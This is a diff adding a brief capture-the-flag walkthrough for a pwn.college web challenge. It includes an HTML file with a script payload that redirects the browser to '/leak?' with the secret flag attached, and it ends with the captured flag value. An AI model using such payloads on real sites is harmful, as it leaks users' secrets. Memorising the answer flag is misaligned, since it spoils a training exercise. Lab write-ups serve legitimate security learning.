@@ -1,0 +1,13 @@
+Start the challenge and read the code. cat /challenge/server
+Start Terminal1 or Tab1 and start the server: /challenge/server
+Start Terminal2 or Tab2 and write the following HTML file.
+
+mkdir -p /home/hacker/public_html
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<script src="/gateway"></script>
+<script>window.location="/leak?"+flag</script>
+EOF
+
+Start the server by typing /challenge/server and the client by /challenge/client both in different tabs of terminal.
+The flag will show in the server capture requests.
+The flag is: pwn.college{Af4d3Wyr5X48KGxp7tYgm46Lq9d.QX2EDM1EDL5MjM1QzW} 
